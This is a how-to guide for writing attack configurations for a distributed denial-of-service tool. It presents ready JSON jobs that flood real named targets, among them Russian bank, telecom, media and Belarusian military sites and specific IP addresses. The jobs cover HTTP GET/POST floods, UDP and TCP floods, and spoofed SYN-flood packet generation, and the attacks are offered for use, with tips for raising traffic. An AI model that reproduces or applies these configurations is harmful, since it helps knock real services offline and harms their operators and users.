# Instructions for changing config

Config contains array of jobs, which actually are targets to attack. Each target is attacked in parallel similar to as if for example you launched few instances of alpine/bombardier.

Lets talk about each type of jobs.

*Please take into consideration that config file has json format which has its syntax rules. There are lots of extensions for formatting. Please remove comments from the config before applying it as json doesn't support comments and they are added to this guide purely for your comfort*

# HTTP JOB

Use to attack target via http/https protocols. Usually used ports 80 and 443 but can be different. 
You can add few jobs on one target, for example one for getting main page(GET), another for login(POST to special url) or etc.

**Structure of HTTP GET Job**

```json
{
    "type": "http",
    "args": {
        "method": "GET" //GET is used to get main page information so it should 100% when getting target,
        "path": "http://sberbank.com" //url to target,
        "interval_ms" : 1  // the less number is the more traffic is send
    },
    "client" : {
        "async": true // doesn't wait for response of previous request, by default false
    }
}
```

`"args.path"` can be in format `protocol://url:port`, for example `http://127.0.0.1:80`

In POST request "headers" must contains "Authorization" header with value beginning with "Bearer" word and "body" which could be random text (or you can make it generate the text for each request by specifying `"{{- random_payload 100 -}}"` where 100 is the length of the text you want it to send). If you want to be extra cool you can generate the value going after `"Bearer: "` via [jwt.io](https://jwt.io)

For experienced users: you can configure other auth methods as well by specifying required headers/body as you would do it with curl

```json
{
      "type": "http",
      "args": {
        "method": "POST" // POST is used to pass some data to API for example for login,
        "path": "https://portal.rt-dc.ru/index.php?login=yes",
        "headers": {
          "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        },
        "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn"
      }
}
```

Use different methods to generate 'real-like' traffic.
You can also use jobs with different methods if you know sites' API.

### Examples 

```json
{
      "type": "http",
      "args": {
        "method": "GET",
        "path": "https://www.mil.by/",
        "headers": {}
      }
}
```
```json
{
      "type": "http",
      "args": {
        "method": "POST",
        "path": "https://capsule.rt.ru/Login/Login",
        "headers": {
          "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        },
        "body": "{{- random_payload 100 -}}"
      }
}
```
```json
{
      "type": "http",
      "args": {
        "method": "POST",
        "path": "https://portal.rt-dc.ru/index.php?login=yes",
        "headers": {
          "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        },
        "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn"
      }
}
```



# UDP JOB

Use to attack target via udp protocol. 

`"args.address"` in format `ip:port` or `hostname:port`

**Structure of UDP Job**
```json
{
      "type": "udp",
      "args": {
        "address": "80.87.198.26:53",
        "interval_ms": 135,
        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
      }
}
```


### Examples
```json
 {
      "type": "udp",
      "args": {
        "address": "80.87.198.26:53",
        "interval_ms": 135,
        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
      }
 }
```
```json
 {
      "type": "udp",
      "args": {
        "address": "80.87.198.26:53",
        "interval_ms": 135,
        "body": "{{- random_payload 100 -}}"
      }
}
```


# TCP JOB

Use to attack target via tcp protocol. 

`"args.address"` in format `ip:port` or `hostname:port`

**Structure of TCP Job**
```json
{
      "type": "tcp",
      "args": {
        "address": "178.248.236.218:77",
        "interval_ms": 135,
        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
      }
}
```


### Examples
```json
{
      "type": "tcp",
      "args": {
        "address": "178.248.236.218:80",
        "interval_ms": 135,
        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
      }
    }
```
```json
{
      "type": "tcp",
      "args": {
        "address": "178.248.236.218:77",
        "interval_ms": 135,
        "body": "{{- random_payload 100 -}}"
      }
}
```


#  PACKETGEN JOB

Use if you want to you attack using more advanced techniques.
For experienced users this techniques includes ips/port spoofing, sending malformed tcp/udp/ip/ethernet frames(more protocols to be added).

**Structure of PACKETGEN Job**
```json
 {
		"type": "packetgen",
		"args": {
		  "host": "lenta.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
}
```


### Examples (syn-flood attack via packetgen)
```json
{
		"type": "packetgen",
		"args": {
		  "host": "lenta.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
}
```

```json
{
		"type": "packetgen",
		"args": {
		  "host": "rg.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "194.190.37.226"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
}
```